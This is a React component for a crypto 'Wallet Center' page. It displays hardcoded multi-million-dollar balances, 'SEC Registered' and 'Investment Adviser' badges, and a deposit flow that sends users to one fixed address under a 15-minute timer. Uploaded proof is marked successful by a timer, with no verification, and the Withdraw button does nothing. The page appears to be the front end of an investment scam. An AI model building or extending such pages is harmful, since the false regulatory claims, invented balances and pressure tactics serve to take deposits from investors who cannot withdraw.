
import React, { useState, useEffect } from 'react';
import { Shield, Plus, ArrowUpRight, ChevronRight, History, X, Copy, Check, Clock, Upload, Loader2, Sparkles, ChevronDown } from 'lucide-react';

const WalletPage: React.FC = () => {
  const [isDepositFormOpen, setIsDepositFormOpen] = useState(false);
  const [modalStatus, setModalStatus] = useState<'input' | 'payment' | 'processing' | 'success'>('input');
  const [amount, setAmount] = useState('0.00');
  const [crypto, setCrypto] = useState('USDT');
  const [network, setNetwork] = useState('ERC 20');
  const [timeLeft, setTimeLeft] = useState(900); // 15 minutes
  const [isCopied, setIsCopied] = useState(false);
  const [proofFile, setProofFile] = useState<File | null>(null);

  const transactions = [
    { type: 'Deposit', amount: 100000.00, date: 'Dec 16, 2025', asset: 'ETH', status: 'Approved', color: 'text-emerald-500' },
    { type: 'Deposit', amount: 5000.00, date: 'Dec 16, 2025', asset: 'USDT', status: 'Approved', color: 'text-emerald-500' },
    { type: 'Deposit', amount: 800000.00, date: 'Dec 5, 2025', asset: 'USDT', status: 'Approved', color: 'text-emerald-500' },
    { type: 'Withdrawal', amount: -5000.00, date: 'Dec 24, 2025', asset: 'USDT', status: 'Approved', color: 'text-red-500' },
  ];

  const deposits = transactions.filter(t => t.type === 'Deposit');

  useEffect(() => {
    if (modalStatus === 'payment' && timeLeft > 0) {
      const timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
      return () => clearInterval(timer);
    }
  }, [modalStatus, timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopy = () => {
    navigator.clipboard.writeText('0x906b2533218Df3581da06c697B51eF29f8c86381');
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000);
  };

  const handleShowPayment = () => {
    if (parseFloat(amount) <= 0) return;
    setModalStatus('payment');
  };

  const handleSubmitProof = () => {
    setModalStatus('processing');
    setTimeout(() => {
      setModalStatus('success');
    }, 2000);
  };

  const resetFlow = () => {
    setIsDepositFormOpen(false);
    setModalStatus('input');
    setAmount('0.00');
    setTimeLeft(900);
    setProofFile(null);
  };

  return (
    <div className="px-4 py-6 space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-700">
      {/* Header Section */}
      <header>
        <p className="text-[10px] font-black text-emerald-500 uppercase tracking-widest mb-1">Wallet Center</p>
        <h2 className="text-3xl font-black text-white tracking-tight mb-2">Manage your funds</h2>
        <p className="text-sm text-zinc-500 font-medium">Deposit, withdraw, and monitor balances.</p>
      </header>

      {/* Security Badges */}
      <div className="bg-[#121212] border border-white/5 rounded-2xl p-4 flex flex-wrap justify-center gap-4">
        <div className="flex items-center gap-2 text-[11px] font-bold text-zinc-400">
          <Shield size={14} className="text-emerald-500" />
          SEC Registered
        </div>
        <div className="flex items-center gap-2 text-[11px] font-bold text-zinc-400">
          <Shield size={14} className="text-emerald-500" />
          Investment Adviser
        </div>
        <div className="flex items-center gap-2 text-[11px] font-bold text-zinc-400">
          <Shield size={14} className="text-emerald-500" />
          Secure Connection
        </div>
      </div>

      {/* Wallet Balance Cards... (Keeping original dashboard view) */}
      {!isDepositFormOpen && (
        <>
          <div className="bg-[#121212] border border-white/5 rounded-[24px] p-6">
            <p className="text-[10px] font-black text-zinc-500 uppercase tracking-widest mb-2">Wallet Balance</p>
            <h3 className="text-3xl font-black text-white mb-1 tabular-nums">$2,846,334.33</h3>
            <p className="text-xs text-zinc-500 font-bold">Available instantly</p>
          </div>

          <div className="bg-[#121212] border border-white/5 rounded-[24px] p-6">
            <p className="text-[10px] font-black text-zinc-500 uppercase tracking-widest mb-2">Investing</p>
            <h3 className="text-3xl font-black text-white mb-1 tabular-nums">$3,021,948.70</h3>
            <p className="text-xs text-zinc-500 font-bold">Total amount invested</p>
          </div>

          <div className="bg-[#121212] border border-white/5 rounded-[24px] p-6">
            <p className="text-[10px] font-black text-zinc-500 uppercase tracking-widest mb-2">Profit</p>
            <h3 className="text-3xl font-black text-white mb-1 tabular-nums">$14,863.13</h3>
            <p className="text-xs text-emerald-500 font-black">Lifetime performance</p>
          </div>

          <div className="space-y-3">
            <button 
              onClick={() => setIsDepositFormOpen(true)}
              className="w-full bg-[#0c1a12] border border-emerald-500/20 rounded-[24px] p-6 flex items-center justify-between group active:scale-[0.98] transition-all"
            >
              <div className="text-left">
                <p className="text-[10px] font-black text-emerald-500 uppercase tracking-widest mb-1">Deposit</p>
                <h4 className="text-lg font-black text-white">Add funds quickly</h4>
                <p className="text-xs text-zinc-500 font-bold">Crypto and fiat methods</p>
              </div>
              <div className="w-10 h-10 bg-emerald-500 rounded-full flex items-center justify-center text-black group-hover:scale-110 transition-transform">
                <Plus size={24} strokeWidth={3} />
              </div>
            </button>

            <button className="w-full bg-[#1a120c] border border-orange-500/20 rounded-[24px] p-6 flex items-center justify-between group active:scale-[0.98] transition-all">
              <div className="text-left">
                <p className="text-[10px] font-black text-orange-500 uppercase tracking-widest mb-1">Withdraw</p>
                <h4 className="text-lg font-black text-white">Cash out securely</h4>
                <p className="text-xs text-zinc-500 font-bold">Track status in real time</p>
              </div>
              <div className="w-10 h-10 bg-orange-600 rounded-full flex items-center justify-center text-white group-hover:scale-110 transition-transform">
                <ArrowUpRight size={24} strokeWidth={3} />
              </div>
            </button>
          </div>
        </>
      )}

      {/* Deposit Flow Form */}
      {isDepositFormOpen && (
        <div className="animate-in slide-in-from-right-4 duration-500 bg-[#0a0a0a] border border-white/5 rounded-[32px] p-6 space-y-6 relative overflow-hidden">
          <button 
            onClick={() => setIsDepositFormOpen(false)}
            className="absolute top-6 right-6 p-2 text-zinc-600 hover:text-white transition-colors"
          >
            <X size={20} />
          </button>

          <header>
            <p className="text-[10px] font-black text-zinc-500 uppercase tracking-widest mb-2">Instant Funding</p>
            <h3 className="text-xl font-black text-white mb-2 leading-snug">Upload deposit proof and update balances instantly.</h3>
            <p className="text-sm text-zinc-600 font-bold">Select wallet, method, and attach proof. We update once approved.</p>
          </header>

          <div className="space-y-6">
            <button className="w-full py-3.5 bg-emerald-500 text-black font-black rounded-xl uppercase tracking-widest text-[11px] hover:bg-emerald-400 transition-colors shadow-lg shadow-emerald-500/10">
              New deposit
            </button>

            <div className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Amount</label>
                <input 
                  type="text"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full bg-[#121212] border border-white/5 rounded-xl py-4 px-4 text-lg font-black text-white focus:outline-none focus:border-emerald-500/50 transition-all placeholder:text-zinc-800"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Cryptocurrency</label>
                <div className="relative">
                  <select 
                    value={crypto}
                    onChange={(e) => setCrypto(e.target.value)}
                    className="w-full bg-[#121212] border border-white/5 rounded-xl py-4 px-4 text-sm font-black text-white appearance-none focus:outline-none focus:border-emerald-500/50 transition-all"
                  >
                    <option>USDT</option>
                    <option>BTC</option>
                    <option>ETH</option>
                  </select>
                  <ChevronDown size={18} className="absolute right-4 top-1/2 -translate-y-1/2 text-zinc-500 pointer-events-none" />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Network</label>
                <div className="relative">
                  <select 
                    value={network}
                    onChange={(e) => setNetwork(e.target.value)}
                    className="w-full bg-[#121212] border border-white/5 rounded-xl py-4 px-4 text-sm font-black text-white appearance-none focus:outline-none focus:border-emerald-500/50 transition-all"
                  >
                    <option>ERC 20</option>
                    <option>TRC 20</option>
                    <option>BEP 20</option>
                  </select>
                  <ChevronDown size={18} className="absolute right-4 top-1/2 -translate-y-1/2 text-zinc-500 pointer-events-none" />
                </div>
              </div>
            </div>

            <div className="py-2">
              <p className="text-[11px] font-bold text-zinc-600 leading-relaxed">
                Funding window expires in <span className="text-emerald-500 font-black">15:00</span>. Please confirm transaction hash to accelerate verification.
              </p>
            </div>

            <button 
              onClick={handleShowPayment}
              className="w-full py-4 bg-emerald-500 text-black font-black rounded-xl uppercase tracking-widest text-sm hover:bg-emerald-400 transition-all shadow-xl shadow-emerald-500/20 active:scale-[0.98]"
            >
              Show Payment Window
            </button>
          </div>
        </div>
      )}

      {/* Payment Proof Modal Overlay */}
      {modalStatus !== 'input' && (
        <div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4 animate-in fade-in duration-300">
          <div className="bg-[#121212] w-full max-w-md rounded-[32px] p-6 border border-white/5 animate-in slide-in-from-bottom-8 shadow-2xl relative overflow-hidden">
            
            {modalStatus === 'payment' && (
              <div className="space-y-8 animate-in zoom-in-95 duration-300">
                <button 
                  onClick={() => setModalStatus('input')}
                  className="absolute top-6 right-6 p-2 text-zinc-500 hover:text-white transition-colors"
                >
                  <X size={20} />
                </button>

                <div className="text-center pt-2">
                  <h3 className="text-2xl font-black text-white mb-2 tracking-tight">Send {crypto}</h3>
                  <p className="text-zinc-500 text-sm font-bold">Complete payment and upload proof</p>
                </div>

                <div className="space-y-3">
                  <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Wallet Address</label>
                  <div className="bg-[#0a0a0a] border border-white/5 rounded-2xl p-4 break-all">
                    <p className="text-xs font-black text-white leading-relaxed font-mono">
                      0x906b2533218Df3581da06c697B51eF29f8c86381
                    </p>
                  </div>
                  <button 
                    onClick={handleCopy}
                    className="w-full py-3.5 border border-zinc-800 hover:border-zinc-700 text-zinc-300 font-black rounded-xl uppercase tracking-widest text-[11px] transition-all flex items-center justify-center gap-2"
                  >
                    {isCopied ? <Check size={14} className="text-emerald-500" /> : <Copy size={14} />}
                    {isCopied ? 'Address Copied' : 'Copy Address'}
                  </button>
                </div>

                <div className="bg-[#0a0a0a] border border-white/5 rounded-3xl p-6 text-center">
                  <p className="text-[10px] font-black text-zinc-600 uppercase tracking-widest mb-2">Timer</p>
                  <div className="flex items-center justify-center gap-3 text-4xl font-black text-emerald-500 tabular-nums">
                    {formatTime(timeLeft)}
                  </div>
                </div>

                <div className="space-y-4">
                  <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Upload Payment Proof</label>
                  <div className="flex items-center gap-4">
                    <label className="cursor-pointer bg-zinc-900 border border-zinc-800 px-4 py-2.5 rounded-xl text-[11px] font-black text-white hover:bg-zinc-800 transition-colors uppercase tracking-widest">
                      Choose File
                      <input type="file" className="hidden" onChange={(e) => setProofFile(e.target.files?.[0] || null)} />
                    </label>
                    <span className="text-xs text-zinc-600 font-bold truncate flex-1">
                      {proofFile ? proofFile.name : 'No file selected'}
                    </span>
                  </div>
                  <p className="text-[10px] font-bold text-zinc-600">Screenshot or PDF up to 10MB</p>
                </div>

                <button 
                  onClick={handleSubmitProof}
                  className="w-full py-4 bg-[#10b981]/90 hover:bg-[#10b981] text-black font-black rounded-xl uppercase tracking-widest text-sm transition-all shadow-xl active:scale-[0.98]"
                >
                  Confirm & Submit
                </button>
              </div>
            )}

            {modalStatus === 'processing' && (
              <div className="py-20 flex flex-col items-center justify-center text-center">
                <div className="relative mb-8">
                  <Loader2 size={48} className="text-emerald-500 animate-spin" strokeWidth={3} />
                  <div className="absolute inset-0 bg-emerald-500/20 blur-2xl animate-pulse" />
                </div>
                <h3 className="text-xl font-black text-white mb-2 uppercase tracking-widest">Processing Deposit</h3>
                <p className="text-zinc-500 text-sm font-bold">Verifying your payment proof...</p>
              </div>
            )}

            {modalStatus === 'success' && (
              <div className="animate-in zoom-in-95 duration-500 text-center pb-4">
                <div className="flex flex-col items-center mb-8 mt-6">
                  <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center mb-6 relative">
                    <Check size={40} className="text-emerald-500" strokeWidth={3} />
                    <div className="absolute inset-0 bg-emerald-500 blur-2xl opacity-20" />
                    <Sparkles className="absolute -top-1 -right-1 text-yellow-400 animate-bounce" size={24} />
                  </div>
                  <h3 className="text-2xl font-black text-white mb-2">Deposit Submitted</h3>
                  <p className="text-zinc-500 text-sm font-bold max-w-[280px]">
                    Your request for <span className="text-white">${amount} {crypto}</span> is being processed.
                  </p>
                </div>

                <div className="bg-white/[0.02] border border-white/5 rounded-3xl p-6 text-left mb-10">
                  <p className="text-[11px] font-bold text-zinc-500 leading-relaxed italic">
                    Funds will appear in your wallet balance once confirmed by our financial desk. This usually takes 5-15 minutes.
                  </p>
                </div>

                <button 
                  onClick={resetFlow}
                  className="w-full py-4 bg-white text-black font-black rounded-full uppercase tracking-widest text-sm transition-all shadow-xl active:scale-[0.98]"
                >
                  Return to Wallet
                </button>
              </div>
            )}

          </div>
        </div>
      )}

      {/* Original History Section (Shown only on dashboard) */}
      {!isDepositFormOpen && (
        <>
          {/* Deposits Timeline */}
          <div className="bg-[#121212] border border-white/5 rounded-[24px] p-6">
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-2">
                <History size={16} className="text-zinc-500" />
                <div>
                  <p className="text-[10px] font-black text-zinc-500 uppercase tracking-widest">History</p>
                  <h4 className="text-lg font-black text-white">Deposits timeline</h4>
                </div>
              </div>
              <button className="text-emerald-500 text-sm font-black flex items-center gap-1">
                View all
              </button>
            </div>

            <div className="space-y-6">
              {deposits.map((tx, i) => (
                <div key={i} className="flex items-center justify-between">
                  <div>
                    <p className="text-lg font-black text-white tabular-nums">${tx.amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}</p>
                    <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mt-0.5">{tx.date} • {tx.asset}</p>
                  </div>
                  <div className="bg-emerald-500/10 text-emerald-500 px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-emerald-500/20">
                    {tx.status}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Recent Movement */}
          <div className="bg-[#121212] border border-white/5 rounded-[24px] p-6 pb-2">
            <div className="flex items-center justify-between mb-8">
              <h4 className="text-sm font-black text-zinc-500 uppercase tracking-widest">Recent Movement</h4>
              <button className="text-emerald-500 text-sm font-black">All transactions</button>
            </div>

            <div className="space-y-8">
              {transactions.slice(0, 3).map((tx, i) => (
                <div key={i} className="flex items-center justify-between pb-6 border-b border-white/5 last:border-0">
                  <div>
                    <p className="text-base font-black text-white">{tx.type}</p>
                    <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest mt-1">{tx.date}</p>
                  </div>
                  <div className="text-right">
                    <p className={`text-base font-black tabular-nums ${tx.amount > 0 ? 'text-white' : 'text-zinc-400'}`}>
                      {tx.amount > 0 ? '+' : ''}${Math.abs(tx.amount).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                    </p>
                    <div className="flex items-center justify-end gap-1 mt-1">
                      <span className="w-1 h-1 bg-emerald-500 rounded-full" />
                      <span className="text-[10px] font-black text-emerald-500 uppercase tracking-widest">{tx.status}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default WalletPage;
